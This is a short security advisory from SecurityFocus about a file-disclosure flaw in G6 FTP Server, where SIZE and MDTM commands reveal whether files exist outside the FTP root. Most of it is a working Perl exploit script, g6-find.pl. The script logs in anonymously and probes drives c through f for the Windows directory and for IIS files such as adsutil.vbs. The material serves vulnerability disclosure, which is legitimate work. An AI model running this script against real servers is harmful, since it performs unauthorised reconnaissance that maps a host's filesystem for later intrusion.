source: http://www.securityfocus.com/bid/2537/info

A user can confirm the existence and location of files and directory structure information, by submitting a 'size' or 'mdtm' command of a file. If the command is carried out by the vulnerable service, the attacker can confirm the location of the file.

Submitting a 'size' or 'mdtm' command for a file outside of the FTP root could disclose directory structure information of unpublished filesystems on the host. If the requested command is fulfilled by the vulnerable service, the attacker can confirm the relative path to the file.

Either request is achievable even if the 'show relative paths' option is not enabled. 

#!/usr/bin/perl
# g6-find.pl
# example G6 Ftp Server file disclosure vulnerability script
use Getopt::Std;
use IO::Socket;
getopts('h:l:p:',\%args);
my ($CRLF,$port,$login,$pass,$sock_res,$win_base,$iis_base,@drives);
$CRLF = "\015\012";
@drives = ("c","d","e","f");
$port = 21;
$login = 'anonymous';
$pass = 'user@myhost.com';
if (defined $args{h}) { $host = $args{h}; } else { print "No host
specified.\n"; exit; }
if (defined $args{l}) { $login = $args{l}; }
if (defined $args{p}) { $pass = $args{p}; }
$sock =
IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$host,PeerPort=>$port) ||
die("Socket errors: $!");
$sock_res = <$sock>;
print $sock "USER $login" . $CRLF;
$sock_res = <$sock>;
print $sock "PASS $pass" . $CRLF;
$sock_res = <$sock>;
if ($sock_res !~ /230\s/) { print "Login/password not
accepted...exiting.\n"; close($sock); exit; }
print $sock "PWD" . $CRLF;
$sock_res = <$sock>;
if (lc($sock_res) !~ /\/[a-z][:]\//) { print "Looks like 'show relative
path' is enabled...exiting.\n";close($sock);exit;}
print "Attempting to locate system files...";
$win_base = &FindWindows;
$iis_base = &FindIIS;
print "done.\n\n"; close($sock);
print "Windows directory: $win_base\n";
print "Hints to IIS path: $iis_base\n";
exit;
sub FindWindows {
my @win_dirs = ("win","windows","winnt","winme");
        foreach $drive (@drives)
        {
                foreach $dir (@win_dirs)
                {
                        print ".";
                        print $sock "SIZE
/$drive:/$dir/regedit.exe" . $CRLF;
                        $sock_res = <$sock>;
                        if ($sock_res =~ /213\s/) {
return("$drive:\\$dir");}
                }
        }
return("not found");
}

sub FindIIS {
my @iis_files =
("Inetpub/wwwroot/_vti_inf.html","Inetpub/Adminscripts/adsutil.vbs","Inetpub/wwwroot/default.asp");
        foreach $drive (@drives)
        {
                foreach $file (@iis_files)
                {
                        print ".";
                        print $sock "SIZE /$drive:/$file" . $CRLF;
                        $sock_res = <$sock>;
                        if ($sock_res =~ /213\s/) { 
                                $file =~ s/\//\\/g;                     
                                return("$drive:\\$file");
                        }
                }
        }
return("not found");    
}